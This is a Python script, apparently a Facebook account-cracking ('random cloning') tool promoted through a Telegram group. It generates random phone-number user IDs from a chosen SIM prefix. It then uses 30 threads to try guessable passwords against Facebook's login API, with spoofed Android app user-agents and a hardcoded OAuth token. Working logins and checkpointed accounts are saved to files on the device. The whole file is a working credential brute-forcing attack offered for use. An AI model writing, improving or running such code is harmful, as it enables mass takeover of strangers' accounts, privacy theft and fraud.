#====== DEVELOPER : KALYAN KING =====#
#===== TELEGRAM : KGF CYBER KING =====#

import os, random, uuid, string, sys, requests, time
from concurrent.futures import ThreadPoolExecutor as ThreadPool

#-------------- COLORS ----------------#
B = "\033[1;37m"  # White
R = "\033[1;31m"  # Red
G = "\033[1;32m"  # Green
Y = "\033[1;33m"  # Yellow
C = "\033[1;36m"  # Cyan
P = "\033[1;35m"  # Purple
colors = [B, C, P, G]

#-------------- GLOBALS ----------------#
oks = []
cps = []
loop = 0

#========= RANDOM USER-AGENT =========#
def random_ua():
    models = [
        "RMX2185","RMX2189","RMX2180","RMX2101","RMX3063","RMX3201","RMX3193","RMX2151",
        "RMX3085","RMX2193","SM-A125F","SM-M215F","CPH1803","CPH1909","V2027","Vivo 1904",
        "Vivo 1820","Vivo 1938","MI 5X","Redmi Note 9 Pro","Redmi 9A","Redmi 10","Redmi Note 10",
        "Redmi 8A","Redmi 8","Samsung Galaxy S10","Samsung Galaxy S20","Samsung Galaxy A51",
        "Samsung Galaxy A12","Samsung Galaxy M31","OPPO A5s","OPPO F11","OPPO Reno 2","OPPO Reno 3",
        "Realme 5","Realme 5i","Realme 6","Realme 6i","Realme 7","Realme C11","Realme C15","Huawei P30",
        "Huawei P40","Huawei Y9","Huawei Y7","Nokia 6.1","Nokia 7 Plus","Nokia 5.3","OnePlus 7T",
        "OnePlus 8","OnePlus 8T","OnePlus 9","Infinix Hot 10","Infinix Note 8","Infinix Smart 5"
    ]
    android_versions = ["7.0","7.1.1","8.0","8.1.0","9","10","11","12","13"]
    fb_versions = ["365.0.0.30.112","366.0.0.35.100","367.0.0.25.102","368.0.0.29.109",
                   "369.0.0.23.103","370.0.0.25.105","371.0.0.20.107","372.0.0.21.108",
                   "373.0.0.26.110","374.0.0.28.111"]
    model = random.choice(models)
    android_version = random.choice(android_versions)
    fb_version = random.choice(fb_versions)
    ua = (
        f"[FBAN/FB4A;FBAV/{fb_version};"
        f"FBBV/{random.randint(300000000,400000000)};"
        f"FBDM/{{density=2.25,width=720,height=1400}};"
        f"FBLC/en_US;FBRV/{random.randint(300000000,400000000)};"
        f"FBCR/Grameenphone;FBMF/{model.split()[0]};FBBD/{model.split()[0]};"
        f"FBPN/com.facebook.katana;FBDV/{model};FBSV/{android_version};"
        f"FBOP/1;FBCA/arm64-v8a:;]"
    )
    return ua

#============== UTILITY FUNCTIONS =============#
def clear_screen():
    os.system("clear")

def print_header():
    clear_screen()
    print(f"{C}")
    print(f"{C} {B} TOOLS CREATED BY : {R}KALYAN KING                  {C}")
    print(f"{C} {B} VERSION         : {G}0.3                                     {C}")
    print(f"{C} {B} TOOL TYPE       : {Y}RANDOM FIRE                              {C}")
    print(f"{C}")
    print(f"{random.choice(colors)}")

def print_line():
    print(f"{random.choice(colors)}")

#============== MENU ==============#
def main_menu():
    print_header()
    print(f"{B}[{C}01{B}]  RANDOM CLONING")
    print(f"{B}[{C}02{B}]  JOIN TELEGRAM GROUP")
    print(f"{B}[{C}03{B}]  CONTACT WHATSAPP")
    print(f"{B}[{C}00{B}]  EXIT PROGRAM")
    print_line()
    os.system("xdg-open https://t.me/KGF_TEAM_CYBER")
    option = input(f"{B}[{C}?{B}] CHOOSE OPTION >> ")
    
    if option in ['01','1']:
        random_cloning()
    elif option in ['02','2']:
        os.system("xdg-open https://t.me/KGF_TEAM_CYBER"); time.sleep(1)
        main_menu()
    elif option in ['03','3']:
        os.system("xdg-open https://t.me/KGF_TEAM_CYBER"); time.sleep(1)
        main_menu()
    elif option in ['00','0']:
        exit(f"{G}Thanks for using! {B}")
    else:
        print(f"{R}Invalid option!  Try again...{B}")
        time.sleep(1)
        main_menu()

#============== CLONING FUNCTION ==============#
def random_cloning():
    users = []
    print_header()
    print('  EXAMPLE SIM CODE : [016] [017] [018] [019]')
    code = input('  ENTER SIM CODE >> ')
    print_line()
    print('  EXAMPLE LIMIT : [1000] [2000] [5000] [10000]')
    try:
        limit = int(input('  ENTER LIMIT >> '))
    except:
        limit = 5000

    for _ in range(limit):
        users.append(''.join(random.choice(string.digits) for _ in range(8)))
    
    print_header()
    print(f"  TOTAL ACCOUNTS : {len(users)}")
    print(f"  SIM CODE       : {code}")
    print(f"{Y} FAST SPEED CLONING STARTED...{B}")
    print_line()

    with ThreadPool(max_workers=30) as pool:
        for u in users:
            uid = code + u
            passwords = [u, uid, uid[:7], uid[:6], uid[5:], uid[4:], 'sadiya','jannat','abir123','taniya']
            pool.submit(crack_method, uid, passwords)

    print_line()
    print(f"  CLONING COMPLETE \n  TOTAL OK  : {len(oks)}\n  TOTAL CP  : {len(cps)}")
    input(" PRESS ENTER TO BACK >> ")
    main_menu()

#============== CRACK METHOD ==============#
def crack_method(uid, passwords):
    global loop
    for pw in passwords:
        sys.stdout.write(f"\r{B}[ KALYAN-KING] {loop} |  OK:{len(oks)} |  CP:{len(cps)}")
        sys.stdout.flush()
        adid = str(uuid.uuid4())
        device_id = str(uuid.uuid4())
        data = {
            'adid': adid, 'format':'json','device_id':device_id,
            'email':uid,'password':pw,'generate_analytics_claims':'1',
            'credentials_type':'password','source':'login',
            'error_detail_type':'button_with_disabled',
            'enroll_misauth':'false','generate_session_cookies':'1',
            'generate_machine_id':'1','meta_inf_fbmeta':'',
            'currently_logged_in_userid':'0','fb_api_req_friendly_name':'authenticate'
        }
        headers = {
            'User-Agent': random_ua(),'Accept-Encoding':'gzip, deflate','Accept':'*/*',
            'Connection':'keep-alive','Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'X-FB-Friendly-Name':'authenticate','X-FB-Connection-Bandwidth':'21435',
            'X-FB-Net-HNI':'35793','X-FB-SIM-HNI':'37855',
            'X-FB-Connection-Type':'unknown','Content-Type':'application/x-www-form-urlencoded',
            'X-FB-HTTP-Engine':'Liger'
        }
        try:
            res = requests.post('https://api.facebook.com/method/auth.login', data=data, headers=headers).json()
            if 'session_key' in res:
                if uid not in oks:
                    print(f"\n{G}[ OK] {uid} | {pw}{B}")
                    oks.append(uid)
                    open('/sdcard/KALYAN-VAI-OK.txt','a').write(f"{uid} | {pw}\n")
                    break
            elif 'www.facebook.com' in res.get('error_msg',''):
                if uid not in cps:
                    print(f"\n{Y}[ CP] {uid} | {pw}{B}")
                    cps.append(uid)
                    open('/sdcard/KALYAN-VAI-CP.txt','a').write(f"{uid}|{pw}\n")
                    break
        except:
            continue
    loop += 1

#============== RUN TOOL ==============#
if __name__ == "__main__":
    main_menu()